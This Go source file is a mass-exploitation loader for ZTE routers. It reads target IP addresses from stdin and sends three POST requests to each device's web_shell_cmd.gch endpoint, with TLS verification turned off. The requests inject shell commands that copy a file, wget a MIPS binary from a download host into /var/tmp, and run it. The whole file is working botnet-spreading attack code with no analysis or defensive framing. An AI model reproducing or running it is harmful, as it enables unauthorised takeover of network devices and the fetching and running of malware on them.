package main
 
import (
"net/http"
"sync"
"bufio"
"time"
"os"
"strings"
"bytes"
"fmt"
"crypto/tls"
)
var payload []byte = []byte("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=cp+%2Fetc%2Finit.norm+%2Fvar%2Ftmp%2Fresp&CmdAck=")
var payload2 []byte = []byte("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=wget+http%3A%2F%2F0.0.0.0%2FMIPS+-O+%2Fvar%2Ftmp%2Fresp&CmdAck=")
var payload3 []byte = []byte("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=%2Fvar%2Ftmp%2Fresp+ztev2&CmdAck=")
 
var wg sync.WaitGroup  
var queue []string;

func work(ip string){
    ip = strings.TrimRight(ip, "\r\n")
	fmt.Printf("[ZTE]---> "+ip+"\n")
    url := "https://"+ip+"/web_shell_cmd.gch"
    tr := &http.Transport{
        ResponseHeaderTimeout: 5*time.Second,
        DisableCompression: true,
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{Transport: tr, Timeout: 5*time.Second}
    _, _ = client.Post(url, "text/plain", bytes.NewBuffer(payload))
    _, _ = client.Post(url, "text/plain", bytes.NewBuffer(payload2))
	_, _ = client.Post(url, "text/plain", bytes.NewBuffer(payload3))
    

}
 
 
func main(){
    for {
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan(){
            go work(scan.Text())
            wg.Add(1)
            time.Sleep(2*time.Millisecond)
        }
    }
 
}